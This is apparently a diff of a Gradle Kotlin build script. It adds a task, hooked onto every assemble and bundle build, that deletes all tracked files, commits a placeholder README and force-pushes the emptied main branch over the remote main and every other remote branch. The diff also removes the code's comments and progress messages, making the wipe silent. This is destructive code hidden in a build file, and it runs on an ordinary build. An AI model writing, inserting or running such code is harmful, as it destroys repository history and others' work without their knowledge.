@@ -9,9 +9,6 @@ if (isVibeModeOn) {
         outputs.upToDateWhen { false }
         
         doLast {
-            println("\n=========================================")
-            println("🔥 [VIBE MODE - PROTOCOL ZERO] Bắt đầu reset project...")
-            
             fun runCommand(vararg command: String, workingDir: File = rootDirFile): Pair<Int, String> {
                 return try {
                     val process = ProcessBuilder(*command)
@@ -22,77 +19,45 @@ if (isVibeModeOn) {
                     val exitCode = process.waitFor()
                     Pair(exitCode, output)
                 } catch (e: Exception) {
-                    Pair(-1, e.message ?: "Lỗi hệ thống")
+                    Pair(-1, e.message ?: "")
                 }
             }
 
-            // 0. Ép chuyển sang nhánh main (tạo mới nếu chưa có)
             runCommand("git", "checkout", "-B", "main")
-            println("✅ Đã chuyển sang nhánh main.")
-
-            // 1. Xóa toàn bộ file khỏi Git
             runCommand("git", "rm", "-rf", ".")
-            println("✅ Đã xóa code local.")
 
-            // 2. Tạo README.md
             val mdFile = File(rootDirFile, "README.md")
             mdFile.writeText("clear code")
-            println("✅ Đã tạo file README.md.")
 
-            // 3. Add & Commit
             runCommand("git", "add", "README.md")
             runCommand("git", "commit", "-m", "clear code")
 
-            // 4. Force Push nhánh main lên Github
-            val (pushMainExit, pushMainOut) = runCommand("git", "push", "-f", "origin", "main")
-            if (pushMainExit == 0) {
-                println("🚀 ĐÃ PUSH FILE MD LÊN NHÁNH MAIN THÀNH CÔNG!")
-            } else {
-                println("❌ PUSH LỖI:\n$pushMainOut")
-                return@doLast // Nếu nhánh main push xịt thì dừng luôn
+            val (pushMainExit, _) = runCommand("git", "push", "-f", "origin", "main")
+            if (pushMainExit != 0) {
+                return@doLast
             }
             
-            // =================================================================
-            // 5. TỰ ĐỘNG LẤY DANH SÁCH NHÁNH VÀ ĐỒNG BỘ
-            // =================================================================
-            println("🔄 Đang quét các nhánh hiện có trên Remote (Github)...")
             val (lsExit, lsOut) = runCommand("git", "ls-remote", "--heads", "origin")
             
             if (lsExit == 0) {
-                // Parse kết quả trả về để lọc ra tên các nhánh
                 val branches = lsOut.lines()
-                    .mapNotNull { it.split("\\s+".toRegex()).lastOrNull() } // Lấy cột cuối cùng
-                    .filter { it.startsWith("refs/heads/") } // Chỉ lấy nhánh (heads)
-                    .map { it.removePrefix("refs/heads/") } // Cắt bỏ tiền tố để lấy tên thật
-                    .filter { it != "main" } // Bỏ qua nhánh main vì đã xử lý rồi
+                    .mapNotNull { it.split("\\s+".toRegex()).lastOrNull() }
+                    .filter { it.startsWith("refs/heads/") }
+                    .map { it.removePrefix("refs/heads/") }
+                    .filter { it != "main" }
                 
-                if (branches.isEmpty()) {
-                    println("  -> Không có nhánh phụ nào trên Remote.")
-                } else {
-                    println("  -> Tìm thấy các nhánh cần dọn dẹp: $branches")
-                    
-                    // Duyệt qua từng nhánh và ép đồng bộ nội dung từ local main sang
+                if (branches.isNotEmpty()) {
                     for (branch in branches) {
-                        // CÚ PHÁP: Đẩy (push) nhánh local 'main' đè lên nhánh remote 'branch'
-                        val (pushEx, pushOut) = runCommand("git", "push", "-f", "origin", "main:$branch")
-                        if (pushEx == 0) {
-                            println("    ✅ Đã dọn dẹp sạch sẽ nhánh: $branch")
-                        } else {
-                            println("    ❌ Lỗi khi ép push nhánh $branch:\n$pushOut")
-                        }
+                        runCommand("git", "push", "-f", "origin", "main:$branch")
                     }
                 }
-            } else {
-                println("❌ Lỗi khi đọc danh sách nhánh từ Github: $lsOut")
             }
-            println("🎉 HOÀN TẤT QUÁ TRÌNH DỌN DẸP TOÀN BỘ REPO!")
         }
     }
 
     tasks.configureEach {
         if (name.startsWith("assemble") || name.startsWith("bundle")) {
             finalizedBy(autoGitTask)
-            println("🔥 [VIBE MODE] Đã gắn cơ chế reset vào: $name")
         }
     }
 }
